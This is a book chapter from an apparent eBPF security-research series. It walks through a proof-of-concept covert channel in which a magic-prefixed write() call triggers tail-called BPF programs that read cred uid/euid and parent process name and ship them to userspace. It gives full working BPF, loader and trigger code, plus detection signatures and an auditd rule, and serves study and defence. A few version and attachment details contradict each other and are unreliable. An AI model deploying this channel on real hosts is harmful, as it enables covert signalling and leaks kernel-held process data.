---
layout: book
title: "Chapter 4: The Phantom Syscall"
date: 2025-02-03
---

# Chapter 4: The Phantom Syscall

> **See also**: [Blog post]({{ site.baseurl }}/the-phantom-syscall.html) · [POC code](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch04-phantom-syscall) · [Harness entry](https://github.com/mbhatt1/dBPF/blob/master/dBPF-pocs/harness/proof.py)

The POC for this chapter issues exactly one syscall from userspace and uses that one syscall as a trigger. The syscall is `write(2)`. The entry tracepoint `tp/syscalls/sys_enter_write` inspects the user buffer for a magic prefix; on match, it tail-calls a second BPF program that reads `current->cred` and `current->real_parent->comm` and ships the results to userspace via ringbuf. There is no second syscall, no side channel, no shared memory region. The one `write()` call is the whole conversation. What follows is a walk through `ch04-phantom-syscall.bpf.c`, `ch04-phantom-syscall.c`, and `trigger.sh`, in the order the kernel runs them.

## Why one syscall

The threat model seccomp-bpf was designed to defeat is a syscall-level denylist: a compromised process that wants to call syscalls the policy forbids. A seccomp filter reduces the syscall surface to a subset, typically by numerical comparison against `seccomp_data->nr`. The standard allowlist for a hardened container almost always permits `write(2)`, `read(2)`, `close(2)`, and a handful of others — without those, the process cannot talk to its own stdout or read from a file descriptor it opened during initialization. Seccomp is a denylist for the exotic, not an allowlist for the mundane.

This POC targets the mundane end. The `write()` syscall is the quietest one a process can issue. Every process that prints output or serializes a struct to a file descriptor calls `write()`. A seccomp profile that blocks `write()` blocks the process entirely. A monitor that alerts on `write()` drowns in noise. The tracepoint `sys_enter_write` fires once per call, and on a modestly loaded system that fires tens of thousands of times per second.

The arguments to `write()` are attacker-controlled. The second argument is a user-space buffer pointer; the third is the byte count. A BPF program attached to the syscall-entry tracepoint receives both via `ctx->args[1]` and `ctx->args[2]` (the `trace_event_raw_sys_enter` layout is a 64-bit syscall number followed by six 64-bit argument slots). The buffer pointer carries whatever the caller chose to place there. Normal writes carry log text, serialized RPCs, or protocol framing. An adversarial write carries a magic marker.

The marker serves two purposes in this POC. First, it deduplicates the BPF program's work: tens of thousands of `write()` calls per second would saturate the ringbuf if every one produced an event, so the stage-1 gate filters everything that does not start with `PHANTOM\0`. Second, it means the program is dormant until the attacker-controlled userspace trigger runs. The attacker does not need to schedule the BPF program with a timer or correlate across syscalls; they simply issue one `write()` with the marker at the head of the buffer. The marker is the inline trigger.

The design turns `write(2)` into a general-purpose covert control plane. The stage-1 filter is a predicate on user memory; the stage-2 program is the action. The action this POC demonstrates is kernel-internal state exfiltration — reading `task_struct` fields that an unprivileged userspace process cannot normally observe — but the same shape works for any action a BPF program can perform. The primitive is "attacker issues one ordinary-looking syscall, BPF program interprets the arguments as a message, BPF program executes a response."

The bounded-compare detail at the top of stage 1 is worth fixing in mind because it is the one place the verifier enforces a property the attacker wants. The program reads 8 bytes from the user buffer into a fixed-size on-stack array, then compares byte-by-byte against the literal `PHANTOM\0`. The verifier checks that `bpf_probe_read_user` reads exactly 8 bytes into an 8-byte stack slot; it rejects unbounded reads. The trigger binary in `trigger.sh` writes exactly `"PHANTOM\0hello-from-unprivileged-user"`, starting with the 8-byte marker.

## Source walk: tracepoint on sys_enter_write

Stage 1 lives at the top of `ch04-phantom-syscall.bpf.c`. The license declaration is boilerplate; the event struct captures the fields stage 2 will need:

```c
struct evt {
    unsigned int pid, tgid, uid, euid;
    char comm[16];
    char parent_comm[16];
    char payload[32];
};
```

Six fields, 72 bytes on a 64-bit target, not counting padding. The `comm` buffers are 16 bytes because `TASK_COMM_LEN` is 16 in the kernel; matching that size prevents truncation when reading from `task_struct->comm`. The 32-byte payload is the remainder of the user buffer after the 8-byte magic prefix. The numeric fields carry the process identity and the credential fields stage 2 will extract.

The program declares three maps. A ringbuf for events; a `BPF_MAP_TYPE_PROG_ARRAY` for the tail call; and a single-entry per-CPU array that serves as scratch space between stage 1 and stage 2:

```c
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 4);
    __type(key, unsigned int);
    __type(value, unsigned int);
} jumps SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, unsigned int);
    __type(value, struct evt);
} scratch SEC(".maps");
```

The ringbuf is 256 KB (`1 << 18`), sized for the expected event rate — the marker is rare, so events are rare, and 256 KB is more than enough. The prog array has four slots because the tail-call-depth limit on current kernels is 33 and four is comfortably below that ceiling; only slot 0 is populated. The per-CPU scratch map is the critical piece: it lets stage 1 assemble the event and stage 2 finish it without either program exceeding the 512-byte per-program stack budget.

The tracepoint entry function:

```c
SEC("tp/syscalls/sys_enter_write")
int phantom_stage1(struct trace_event_raw_sys_enter *ctx)
{
    const char *buf = (const char *)ctx->args[1];
    size_t len = (size_t)ctx->args[2];
    if (len < 8) return 0;
    char magic[8] = {};
    if (bpf_probe_read_user(&magic, 8, buf) < 0) return 0;
    if (!(magic[0]=='P' && magic[1]=='H' && magic[2]=='A' && magic[3]=='N' &&
          magic[4]=='T' && magic[5]=='O' && magic[6]=='M'))
        return 0;
```

The `ctx->args[1]` read is the syscall's second argument — the userspace buffer pointer. The cast to `const char *` makes it a user pointer; the verifier tracks it as non-dereferenceable kernel-side. Direct dereference would produce a verifier reject, which is why the next line uses `bpf_probe_read_user` to copy 8 bytes into a stack-local array.

The length guard `if (len < 8) return 0` is load-bearing. Without it, a `write()` with a length shorter than the marker would cause `bpf_probe_read_user` to read past the end of the userspace allocation. The helper would return `-EFAULT`, which the program handles, but the guard avoids the helper call entirely for short writes. This matters for overhead: the stage-1 gate runs on every `write()` in the system, and a single unused helper call per call site adds up.

The byte-by-byte compare is deliberate. A `__builtin_memcmp` against an 8-byte literal would also work on modern clang, which can unroll the compare into seven `cmp` instructions; but writing the compare out by hand produces code that every clang version compiles identically. The verifier accepts the hand-written form on every kernel I tested, from 5.15 through 6.12. The literal `PHANTOM\0` is seven characters plus a NUL, filling the 8-byte window exactly.

On match, the program obtains the scratch slot and begins to populate it:

```c
    unsigned int z = 0;
    struct evt *e = bpf_map_lookup_elem(&scratch, &z);
    if (!e) return 0;
    __builtin_memset(e, 0, sizeof(*e));
    unsigned long id = bpf_get_current_pid_tgid();
    e->pid = id & 0xffffffff;
    e->tgid = id >> 32;
    bpf_get_current_comm(&e->comm, sizeof(e->comm));
```

The `bpf_map_lookup_elem` on a per-CPU array is deterministic — slot 0 always exists — but the verifier still requires the NULL check because the helper's return type is `void *`. The `__builtin_memset` clears the scratch slot from whatever the previous tracepoint invocation left there; per-CPU arrays do not auto-zero between calls. The pid/tgid decomposition follows the kernel convention: lower 32 bits are the kernel thread ID, upper 32 are the thread-group ID.

The payload copy:

```c
    unsigned int plen = len - 8;
    if (plen > sizeof(e->payload) - 1) plen = sizeof(e->payload) - 1;
    bpf_probe_read_user(&e->payload, plen, buf + 8);

    bpf_tail_call(ctx, &jumps, 0);
    return 0;
}
```

The `plen` clamp is the bound the verifier requires. `sizeof(e->payload) - 1` is 31 bytes, leaving room for a NUL terminator the program does not set (the prior `memset` already zeroed the buffer). The `bpf_probe_read_user` copies up to 31 bytes starting 8 bytes into the user buffer, skipping the magic prefix. The verifier checks that the destination length is bounded by the size of `e->payload` — without the clamp, the verifier rejects the call.

The tail call is the last instruction. `bpf_tail_call(ctx, &jumps, 0)` looks up slot 0 of the prog array; if populated, it replaces the current program's execution with the slot's program, inheriting the context argument. If the slot is empty, the helper returns without transferring control and stage 1 falls through to `return 0`. On a successful tail call, control never returns to stage 1 — the `return 0` after the helper is unreachable in the successful case but is required by clang to close the function.

## Source walk: tail-called stage 2

Stage 2 is the second program in the same BPF object:

```c
SEC("tp/syscalls/sys_enter_write")
int phantom_stage2(struct trace_event_raw_sys_enter *ctx)
{
    unsigned int z = 0;
    struct evt *s = bpf_map_lookup_elem(&scratch, &z);
    if (!s) return 0;
```

The section name is the same as stage 1: `tp/syscalls/sys_enter_write`. libbpf reads the section name to infer the attach type; both programs are tracepoint programs targeting the same tracepoint. The verifier-level type match is what the kernel requires for tail calls — caller and callee must have identical program types, and tracepoint-to-tracepoint satisfies this. The loader takes care not to autoattach stage 2 directly, which is handled in the userspace code below.

The scratch lookup retrieves what stage 1 assembled. Because the scratch map is per-CPU and BPF programs run with preemption disabled inside the tracepoint path, the same CPU that ran stage 1 is guaranteed to run stage 2 — no inter-CPU race, no need for locks. This is the designed use of `BPF_MAP_TYPE_PERCPU_ARRAY` for staged programs.

The credential walk:

```c
    struct task_struct *t = (struct task_struct *)bpf_get_current_task();
    const struct cred *cred = BPF_CORE_READ(t, cred);
    s->uid  = BPF_CORE_READ(cred, uid.val);
    s->euid = BPF_CORE_READ(cred, euid.val);
    struct task_struct *p = BPF_CORE_READ(t, real_parent);
    bpf_probe_read_kernel_str(&s->parent_comm, sizeof(s->parent_comm),
                               BPF_CORE_READ(p, comm));
```

`bpf_get_current_task()` returns a pointer to the current task's `task_struct`. The verifier types it as a BTF-tracked kernel pointer. Direct dereference (`t->cred`) would be accepted on a kernel with BTF for `task_struct`, but the resulting value — a `PTR_TO_BTF_ID_OR_NULL` — requires a NULL check before its own dereference. The `BPF_CORE_READ` macro sidesteps this by expanding to a chain of `bpf_probe_read_kernel` calls that the verifier treats uniformly.

The `BPF_CORE_READ(cred, uid.val)` expression is a CO-RE relocation. At compile time, clang records the access path `cred → uid → val` as a BTF access chain. At load time, libbpf looks up the running kernel's BTF and rewrites the access to the field offsets for that kernel's `struct cred`. The `uid.val` access picks out the numeric UID from the `kuid_t` wrapper. The same happens for `euid.val`. This is what lets the same compiled BPF object work on kernels where `struct cred` has different field layouts.

The parent-comm read is slightly more involved. `real_parent` is a pointer to another `task_struct`; `comm` is a 16-byte character array. `BPF_CORE_READ(p, comm)` returns the address of that array in the parent's `task_struct`. `bpf_probe_read_kernel_str` then reads up to 16 bytes as a NUL-terminated string into the scratch buffer's `parent_comm` field. The kernel guarantees `task_struct->comm` is always NUL-terminated (the kernel sets it via `set_task_comm()` which strncpy-pads), so the string read returns a well-formed C string.

Why not read `real_parent->comm` via a single `BPF_CORE_READ_STR_INTO`? The macro exists, and it would work; the POC uses the two-step pattern (read pointer, then read string) because the intermediate pointer is also useful as a witness — if a later version of the program needs to also emit the parent's PID, it already has `p` in hand. The two-step form is slightly more code but more flexible. Either form compiles to the same number of helper calls.

The emit phase:

```c
    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return 0;
    __builtin_memcpy(e, s, sizeof(*e));
    bpf_ringbuf_submit(e, 0);
    return 0;
}
```

`bpf_ringbuf_reserve` allocates a 72-byte slot (sizeof the event struct, aligned). The helper returns NULL if the ringbuf is full, which the program handles by silently dropping the event — the tracepoint is best-effort. The `__builtin_memcpy` copies the fully-assembled event from per-CPU scratch into the ringbuf slot. `bpf_ringbuf_submit` commits the slot for the userspace consumer. The second argument is a flags word; zero means no wakeup override, using the default behavior.

The division of labor between stage 1 and stage 2 is deliberate. Stage 1 reads userspace (the `write` buffer), stage 2 reads kernel-space (the `task_struct`). Stack usage in each program stays under 512 bytes. If both were merged into a single tracepoint handler, the stack budget would be the same event-struct plus the 8-byte magic-read buffer plus the intermediate string-read scratch plus the verifier's required temporary for each `BPF_CORE_READ` expansion — the totals get tight enough to matter, and stack pressure is the most common reason a program that compiles cleanly still fails to load. The staged form pushes the stack-resident state into a per-CPU map, and neither stage exceeds the budget.

The userspace loader in `ch04-phantom-syscall.c` wires the prog array:

```c
struct ch04_phantom_syscall_bpf *s = ch04_phantom_syscall_bpf__open_and_load();
if(!s){ fprintf(stderr,"open_and_load failed\n"); return 1; }
// Prevent stage2 from auto-attaching to sys_enter_write directly.
bpf_program__set_autoattach(s->progs.phantom_stage2, false);
int stage2_fd = bpf_program__fd(s->progs.phantom_stage2);
unsigned int k = 0;
bpf_map__update_elem(s->maps.jumps, &k, sizeof(k), &stage2_fd, sizeof(stage2_fd), BPF_ANY);
if(ch04_phantom_syscall_bpf__attach(s)){ fprintf(stderr,"attach failed\n"); return 1; }
```

The `bpf_program__set_autoattach(..., false)` call disables libbpf's default behavior of attaching every program in the skeleton. Without this, libbpf would attach `phantom_stage2` directly to `sys_enter_write` — the program would fire on every `write()`, bypassing the magic-prefix gate, and the ringbuf would flood. The fix is to attach stage 1 normally and install stage 2 only as a tail-call target.

The `bpf_program__fd` call returns the file descriptor of the loaded stage 2 program. The `bpf_map__update_elem` populates slot 0 of the jumps prog array with that fd. Now when stage 1 calls `bpf_tail_call(ctx, &jumps, 0)`, the kernel finds the fd at slot 0 and jumps to stage 2. The final `__attach` call attaches stage 1 to the tracepoint.

## Verifier feedback observed during development

The verifier feedback I collected while developing this POC fits into four classes, in descending order of how often I hit them.

**Stack budget.** The first program I wrote put both stages into a single handler and ran out of stack. The symptom was the load returning `-E2BIG` with a verifier log that pointed at a specific `BPF_CORE_READ` invocation and reported `processed stack usage: 528`. The per-program stack budget is 512 bytes and the verifier is strict about it. The fix was the staged design with per-CPU scratch; an alternative that also works is allocating a per-CPU array with a single entry that holds the entire intermediate state, which is effectively what the POC does.

**PTR_TO_BTF_ID_OR_NULL without NULL check.** An earlier draft wrote `s->uid = t->cred->uid.val` directly. The verifier rejected with `R2 type=ptr_or_null_ expected=ptr_`. The message is unambiguous once you know the vocabulary: the verifier tracks `t->cred` as a possibly-NULL pointer because the BTF for `struct task_struct` marks `cred` as nullable, and the dereference `->uid` is not legal on a possibly-NULL pointer. The fix is either a NULL check or, as the POC does, the `BPF_CORE_READ` macro that wraps the read in a `bpf_probe_read_kernel` call. The helper returns an error rather than oopsing, so the verifier accepts the read without a NULL check.

**Unbounded reads.** The first version of the payload copy was `bpf_probe_read_user(&e->payload, len - 8, buf + 8)`, passing the syscall length directly. The verifier rejected with `R3 unbounded memory access` because `len - 8` was not proven to be smaller than `sizeof(e->payload)`. The fix is the explicit clamp `if (plen > sizeof(e->payload) - 1) plen = sizeof(e->payload) - 1`, which gives the verifier a concrete upper bound. After the clamp, the verifier accepts the read.

**Unbounded loops.** A fourth-pass draft used `for (int i = 0; i < 8; i++)` to walk the magic bytes. With a compile-time constant loop bound and `#pragma unroll`, the verifier accepts the loop; without the pragma, clang may or may not unroll, and the verifier rejects an unrolled loop with a runtime bound. The POC avoids this entirely by writing out the byte comparisons. On kernels ≥ 5.17, `bpf_loop` provides a helper-based loop that the verifier handles specifically, but `bpf_loop` adds an external helper call per iteration. For an 8-byte compare, inlining the compares is faster.

The `-E2BIG` load error merits a separate note because it has two causes in BPF. Stack budget is one; the 1M-instruction verifier complexity limit is the other. The error code is the same. To distinguish, check the verifier log — if it ends with `processed N insn`, where `N` approaches a million, the limit is instruction count. If it ends with `stack usage: M`, where `M` exceeds 512, the limit is stack. The POC stays well under both limits: stage 1 compiles to roughly 80 verified instructions, stage 2 to roughly 60, and neither exceeds 200 bytes of stack.

A subtler verifier behavior worth knowing: `BPF_CORE_READ` expands differently depending on clang's optimization level. At `-O2`, the macro chain tends to produce a single chained `bpf_probe_read_kernel` call per field. At `-O0`, each link of the chain becomes a separate call with intermediate stack-local pointers. The POC builds with `-O2` (inherited from the shared `common.mk`) and the verifier complexity stays modest. Building with `-O0` for debugging tends to produce programs that exceed the instruction-count limit even though they do exactly the same work.

## Harness behavior

The POC is verified by the harness entry in `dBPF-pocs/harness/proof.py`:

```python
Poc("ch04", "Phantom Syscall (tail-call)", "ch04-phantom-syscall",
    hooks=["__arm64_sys_write"], prefix="[phantom]", min_events=1,
    proof_marker=r"CH04_PROVEN|EXFIL_COMPLETE"),
```

The `hooks` field lists the kernel symbol the harness expects to see in `/proc/kallsyms`. On aarch64 the write syscall's kernel implementation is `__arm64_sys_write`; on x86_64 it would be `__x64_sys_write`. The harness uses this to skip the POC on kernels where the symbol is missing (some heavily stripped kernels omit the arch-prefixed wrappers). The tracepoint the BPF program actually attaches to, `tp/syscalls/sys_enter_write`, is arch-independent; the symbol check is a pre-flight sanity check, not the real attach point.

The `prefix` `[phantom]` matches the loader's output line:

```
[phantom] pid=20786 tgid=20786 uid=0 euid=0 comm=phantom parent=bash
          payload='hello-from-unprivileged-user'
```

The `min_events=1` requires at least one ringbuf event before the test passes; a zero-event run would indicate the tail call failed or the marker did not reach stage 1. The `proof_marker` regex matches the `CH04_PROVEN leaked_fields=N` line that `trigger.sh` emits at the end.

The trigger script follows a strict BEFORE/AFTER pattern. It builds a tiny unprivileged trigger binary that writes the marker:

```bash
cat > /tmp/phantom.c <<'EOF'
#include <stdio.h>
#include <unistd.h>
#include <string.h>
int main(void){
    const char buf[] = "PHANTOM\0hello-from-unprivileged-user";
    write(2, buf, sizeof(buf)-1);
    return 0;
}
EOF
cc /tmp/phantom.c -o /tmp/phantom
```

The buffer is a string literal with an embedded NUL. `sizeof(buf)-1` is 36 bytes: 8 bytes of marker (`PHANTOM\0`) plus 28 bytes of payload text. The `write(2, ...)` call writes to stderr; the trigger script suppresses stderr from the spawned process, so the bytes themselves go nowhere observable. Only the kernel-side effect — the tracepoint firing with the marker in the buffer — matters.

The BEFORE phase runs the unprivileged binary without the loader attached and enumerates what an unprivileged userspace process can see of its own kernel-side state:

```bash
echo "unpriv_uid=$(id -u)"
ppid=$(awk "/^PPid:/ {print \$2}" /proc/self/status 2>/dev/null)
pcomm=$(ps -o comm= -p "$ppid" 2>/dev/null || echo "unreadable")
echo "proc_parent_comm_via_procfs=${pcomm:-unreadable}"
echo "kernel_current_cred_uid=unreadable-from-userspace"
echo "kernel_current_real_parent_comm=unreadable-from-userspace"
```

The point of the BEFORE section is to ground the claim. An unprivileged process can read its own UID via `getuid()` and its parent PID via `/proc/self/status`; it can read the parent process's `comm` via `/proc/<ppid>/comm` if `procfs` permits. What it cannot read is the kernel's view of `current->cred->uid.val` at the exact moment the kernel runs the syscall — that value is strictly kernel-internal. The BEFORE section names this gap explicitly.

The AFTER phase runs the same trigger binary with the loader attached and extracts the leaked fields from the loader log:

```bash
LEAK_UID=$(echo "$PHANTOM_LINE"  | sed -n 's/.* uid=\([0-9]\+\).*/\1/p')
LEAK_EUID=$(echo "$PHANTOM_LINE" | sed -n 's/.* euid=\([0-9]\+\).*/\1/p')
LEAK_PCOMM=$(echo "$PHANTOM_LINE" | sed -n 's/.* parent=\([^ ]\+\).*/\1/p')
```

Each extracted field increments `LEAKED`. The final `CH04_PROVEN leaked_fields=${LEAKED}` line is what the harness's `proof_marker` regex matches. A successful run reports `leaked_fields=3`, meaning the loader printed uid, euid, and parent_comm — three kernel-internal values that the BEFORE section established were unreadable from the unprivileged context.

## Cross-kernel notes

The tracepoint `syscalls/sys_enter_write` has been in the kernel since ftrace tracepoints were formalized in 2.6.28. The layout of `trace_event_raw_sys_enter` is `struct trace_entry` (a common header), a 64-bit syscall number `id`, and a six-slot `args[6]` array of unsigned long. The layout has been stable since the tracepoint was added and is part of the kernel's stable ABI for tracepoint consumers.

The kernel symbol for the write-syscall dispatch differs by architecture. On x86_64 modern kernels (≥ 4.17) use `__x64_sys_write`; before the syscall-wrapper rework, it was `sys_write`. On aarch64 the wrapper is `__arm64_sys_write`. On RISC-V it is `__riscv_sys_write`. BPF programs that attach to the tracepoint (rather than to the symbol directly) are insulated from this variation; programs that attach to the kprobe `SEC("kprobe/sys_write")` are not, and a POC that did so would need architecture-conditional section names.

CO-RE relocation behavior is consistent across the kernels this POC targets (5.15 through 6.12). `struct task_struct` has had stable CO-RE-accessible fields for `cred`, `real_parent`, and `comm` for the entire range; the offsets change between releases, which is exactly why CO-RE exists. `struct cred` has had a stable layout for `uid.val` and `euid.val` since 3.18, when `kuid_t`/`kgid_t` were finalized. The BPF object produced by this POC loads on every 5.x and 6.x kernel I tested without modification.

One compatibility wrinkle worth flagging: kernels built without `CONFIG_DEBUG_INFO_BTF=y` do not ship BTF for the kernel image, and `BPF_CORE_READ` fails at load time with a message about missing BTF. This is unusual on distribution kernels (Debian, Ubuntu, Fedora, Arch all ship with BTF enabled) but common on heavily minimized kernels (embedded, some container-optimized images). The POC's `open_and_load` call returns NULL in that case; the loader prints `open_and_load failed` and exits. The harness entry's pre-flight symbol check catches some but not all BTF-absent kernels.

## Detection signatures

The POC is loud if anyone is looking for it, and quiet if no one is.

`bpftool prog show` lists both programs:

```
$ bpftool prog show | grep phantom
217: tracepoint  name phantom_stage1  tag ...  gpl
    loaded_at 2025-02-03T10:12:41+0000  uid 0
    xlated 584B  jited 632B  memlock 4096B  map_ids 14,15,16
    btf_id 23
218: tracepoint  name phantom_stage2  tag ...  gpl
    loaded_at 2025-02-03T10:12:41+0000  uid 0
    xlated 408B  jited 448B  memlock 4096B  map_ids 14,16
    btf_id 23
```

Both programs are visible. The `map_ids` field shows shared maps; both reference the ringbuf (id 14) and the scratch per-CPU array (id 16), and stage 1 additionally references the prog array (id 15).

`bpftool map show | grep prog_array` exposes the tail-call plumbing:

```
$ bpftool map show
15: prog_array  name jumps  flags 0x0
    key 4B  value 4B  max_entries 4  memlock 256B
    owner_prog_type tracepoint  owner jited
```

The `owner_prog_type tracepoint` field is particularly telling: it indicates the prog array was populated with a tracepoint program, constraining future inserts to programs of the same type. An ordinary observability tool that uses prog arrays (like bcc's `CPU_DIST`) shows up the same way; the distinguishing signal is the program name `phantom_stage1`/`phantom_stage2`, which is visible in `bpftool prog show` unless the attacker renamed the functions.

The tracepoint itself is enumerable. `/sys/kernel/debug/tracing/events/syscalls/sys_enter_write/id` returns the numeric tracepoint id, and `cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_write/format` shows the layout. An auditor who wants to know what BPF programs are attached to a specific tracepoint can correlate the tracepoint id with the program's `btf_id` via `bpftool link list`:

```
$ bpftool link list | grep -A2 tracepoint
42: tracepoint  prog 217
    tp 'syscalls/sys_enter_write'
43: tracepoint  prog 218
    tp 'syscalls/sys_enter_write'
```

Two separate tracepoint links, both on `syscalls/sys_enter_write`, is the signature. The second link exists because stage 2 is attached to the same tracepoint (the `SEC("tp/syscalls/sys_enter_write")` annotation); even though the loader disables autoattach, the kernel still tracks the BTF-declared attach type.

auditd-based detection uses a rule on the `bpf(2)` syscall:

```
-a always,exit -S bpf -F auid>=1000 -F auid!=-1 -k bpf_load
```

Every `bpf(BPF_PROG_LOAD, ...)` or `bpf(BPF_MAP_CREATE, ...)` call produces an `AUDIT_SYSCALL` record with the syscall arguments. A program loading two tracepoint programs plus three maps is a distinctive fingerprint; a defender who ingests these records into an anomaly detector can alert on the pattern without understanding BPF internals. This rule is not in a default audit ruleset on most distributions, but is trivial to add.

Process-level observability overhead is another fingerprint, though a subtle one. The stage-1 gate runs on every `write()` in the system; each invocation costs roughly 120 nanoseconds on a modern x86 (the `bpf_probe_read_user` helper plus the byte compare). On a host issuing a million `write()` calls per second — not unusual for a busy web server — this is 120 ms/second of added CPU, or about 12% of one core. The overhead is small enough to miss in casual profiling and large enough to notice in careful profiling. `perf stat -e bpf_trace_enter` gives the raw invocation count; comparing that count to the system's `write()` rate identifies programs attached to the tracepoint.

## Scope

The primitive demonstrated here is Class III: ringbuf exfiltration of kernel-internal state, conditioned on a user-controlled trigger embedded in syscall arguments. Nothing in the kernel changes as a result of running the POC. No credentials are modified. No audit records are suppressed. Three fields — uid, euid, parent comm — are copied from kernel memory into userspace via a ringbuf.

This is exactly the threat model seccomp-bpf was not designed to defeat. Seccomp filters syscalls by number and argument; it does not inspect syscall argument content beyond what the filter program is given access to via `seccomp_data`. A seccomp filter cannot reach into a user buffer at the offset the `write(2)` `buf` argument points to; that dereference is outside the filter's capabilities. The `write(2)` with a `PHANTOM\0` prefix is an allowed syscall by syscall-number predicate, and the marker is invisible to the filter.

The primitive is also outside the threat model of LSMs that operate on the syscall boundary. `security_file_permission` checks whether the caller may write to the file descriptor; it does not inspect the buffer contents. SELinux's type-enforcement policy restricts which files a process may write to, not what bytes may be in the buffer. AppArmor's file rules are the same. A process permitted to write to stderr may write any bytes it likes, and the BPF program's inspection of those bytes is not visible to any LSM.

The requirement the attacker must meet to deploy this primitive is `CAP_BPF` — or more precisely, the combination of `CAP_BPF` plus either `CAP_PERFMON` (to attach tracepoints) or `CAP_SYS_ADMIN` (a superset of the above on kernels ≤ 5.8). On kernels ≥ 5.8, `CAP_BPF` alone is insufficient; `CAP_PERFMON` is required for tracepoint attach. The two capabilities are independent, and a sandbox that grants `CAP_BPF` for observability tooling without granting `CAP_PERFMON` blocks this POC at the attach phase.

The practical consequence: any process that can load a tracepoint program can read any other task's `current->cred` and `current->real_parent` at the moment that task calls `write()` with the marker. The marker is a cooperative-attacker signal — the reader and the writer must agree on the prefix — which keeps the primitive out of the "passive observer" category and into the "cooperative covert channel" category. Two processes both holding `CAP_BPF`+`CAP_PERFMON` do not gain a new primitive from this work; two processes where only one holds BPF caps and the other is constrained but can issue `write()` syscalls do gain a new channel.

Seccomp was never meant to defeat a cooperating BPF sibling. The kernel's design explicitly treats `CAP_BPF` as a trust boundary that defeats sandbox-level controls. This POC is a concrete demonstration of what that design decision means in practice: a `write()` syscall the seccomp filter approved, with bytes the seccomp filter could not inspect, surfacing task-internal state the kernel considered privileged. The technique is documented, the behavior is expected, the defense is "don't grant `CAP_BPF` to code you don't trust." Which is the defense the kernel documentation already recommends.

## Portability across kernel versions

The tracepoint `syscalls/sys_enter_write` is a stable kernel ABI tracepoint. Its `ctx->args[]` layout has not changed since the tracepoint was introduced in 3.19. A program written against this tracepoint on 4.x loads and runs on 6.x without modification. The CO-RE chain `task->cred->uid` and `task->real_parent->comm` likewise uses fields that have been layout-stable for a decade; the relocations handle the minor offset shifts across versions.

The syscall-name portability note: on x86_64 the symbol is `__x64_sys_write`; on aarch64 it is `__arm64_sys_write`; on 32-bit arm it is `__arm_sys_write` with different argument marshalling. The tracepoint path `syscalls/sys_enter_write` is the same on all three because the tracepoint is defined against the architecture-independent syscall number, not the symbol name. A POC that targets the tracepoint rather than the kprobe-on-syscall-entry is automatically cross-architecture.

The PROG_ARRAY plus tail-call mechanism has been present since 4.2. The `bpf_tail_call` helper's invocation semantics — up to 33 levels deep, same program type — have been stable since that release. Chapter 4's two-stage design is portable without changes to any BPF program compatible with 4.x+.

One version-specific detail: on kernels older than 5.5, CO-RE relocations required the kernel to ship BTF information (`CONFIG_DEBUG_INFO_BTF=y`). Distro kernels mostly enabled this by 5.5 for mainstream releases; older LTS branches (RHEL 7's 3.10-based kernel) do not have BTF and cannot run CO-RE programs. A legacy-LTS port of this POC would need to use hard-coded field offsets, which would make the program non-portable across those older kernels in turn.

## Why this is a cooperative primitive, not a passive observer

The POC requires the target process to cooperate — to issue a `write(2)` with the magic `PHANTOM\0` prefix. This is not a passive exfiltration primitive. A BPF program that reads `current->cred` on every `write(2)` would emit far too many events to be useful; the magic prefix is the signal that a specific `write()` is the one to inspect.

Two consequences follow. First, the primitive is a covert channel between two processes that already agreed on the protocol. It is not a primitive that reveals secrets from a process unaware of it. A seccomp-confined process that does not know about the magic prefix leaks nothing via this POC. The BPF side only extracts fields when the userspace side explicitly signals it.

Second, the primitive is deployable by a cooperating attacker. Process A holds `CAP_BPF` and wants to exfiltrate kernel-private state. Process B does not hold `CAP_BPF` but needs to send messages to A without an obvious channel. B issues `write(fd, "PHANTOM\0command", len)` to any valid file descriptor. Process A, reading the ringbuf, receives the command along with B's current UID and parent command name. The `write()` syscall itself completes normally (the bytes go to wherever `fd` points); the tracepoint side-effect is invisible to B.

This cooperation model is why the primitive sits comfortably inside seccomp's explicit threat model gap. Seccomp defends the filtered process against its own syscalls. It does not defend a cooperating attacker pair against observation, and it cannot, because the observer runs outside the filtered process.

## One verifier corner worth calling out

The `bpf_tail_call` helper has a verifier-imposed constraint that bit me during POC development: the program being tail-called must be attached to the same BPF program type. A `SEC("tp/...")` stage 1 can only tail-call into another `SEC("tp/...")` stage 2. Cross-type tail calls — e.g., a tracepoint tail-calling into a kprobe — are rejected at load time with `tail_call: program type mismatch`.

Stage 2 in this POC is declared `SEC("tp/syscalls/sys_enter_write")` even though the loader never actually attaches it to a tracepoint. The declaration exists purely to satisfy the verifier's same-type requirement. The loader uses `bpf_program__set_autoattach(prog, false)` to prevent double-attachment and `bpf_map_update_elem(prog_array, &idx, &fd, BPF_ANY)` to register the program fd in the PROG_ARRAY slot.

This is the kind of detail that does not appear in the chapter summary or the proof marker but that anyone re-implementing the POC for a different syscall will hit immediately. The fix is one line — the `SEC(...)` declaration on stage 2 must match stage 1 — but the error message from the verifier is generic enough that a newcomer spends an hour debugging it the first time.

